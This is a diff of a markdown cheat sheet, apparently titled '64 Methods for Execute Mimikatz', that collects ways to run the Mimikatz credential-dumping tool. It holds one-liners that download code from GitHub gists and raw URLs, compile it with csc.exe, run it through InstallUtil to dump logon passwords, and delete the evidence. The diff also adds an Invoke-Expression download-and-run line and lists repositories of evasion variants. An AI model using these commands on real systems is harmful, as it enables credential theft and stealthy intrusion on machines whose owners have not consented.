@@ -12,10 +12,7 @@ rating: 4.5
 ---
 
 
-
 ## 64 Methods for Execute Mimikatz
-
-
 
 
 ### go-mimikatz
@@ -383,8 +380,6 @@ powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebCl
 powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('https://gist.githubusercontent.com/analyticsearch/7b614f8badabe5bedf1d88056197db76/raw/13966117e4ba13be5da0c4dc44ac9ebfd61fe22a','katz.cs'); && cd c:\Windows\Microsoft.NET\Framework64\v4.* && csc.exe /unsafe /reference:System.IO.Compression.dll /out:katz.exe \\share_ip\share_name\katz.cs && InstallUtil.exe /logfile= /LogToConsole=false /U katz.exe && katz.exe log privilege::debug sekurlsa::logonpasswords exit && del katz.*
 
 cd %temp% && powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('https://gist.githubusercontent.com/analyticsearch/7b614f8badabe5bedf1d88056197db76/raw/13966117e4ba13be5da0c4dc44ac9ebfd61fe22a','katz.cs'); && cd c:\Windows\Microsoft.NET\Framework64\v4.* && csc.exe /unsafe /reference:System.IO.Compression.dll /out:katz.exe %temp%\\katz.cs && InstallUtil.exe /logfile= /LogToConsole=false /U katz.exe && katz.exe log privilege::debug sekurlsa::logonpasswords exit && del katz.* && move mimikatz.log %temp%\\katz.log && cd %temp% && del %temp%\\katz.cs
-
-Give feedback
 ```
 
 https://github.com/analyticsearch/Mimikatz-PE-Injection
@@ -493,7 +488,7 @@ https://github.com/izj007/mimikatz_bypass
 ### JS_MimiKatzDropper
 
 ```
-
+cscript.exe dropper.js
 ```
 
 https://github.com/leinn32/JS_MimiKatzDropper
@@ -503,7 +498,7 @@ https://github.com/leinn32/JS_MimiKatzDropper
 ### mimicats
 
 ```
-cscript.exe dropper.js
+Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/Moon1705/mimicats/master/Mimicats.ps1') Invoke-Cats -Command '"privilege::debug"'
 ```
 
 https://github.com/Moon1705/mimicats
@@ -907,4 +902,5 @@ int main()
 }
 
 ```
+
 
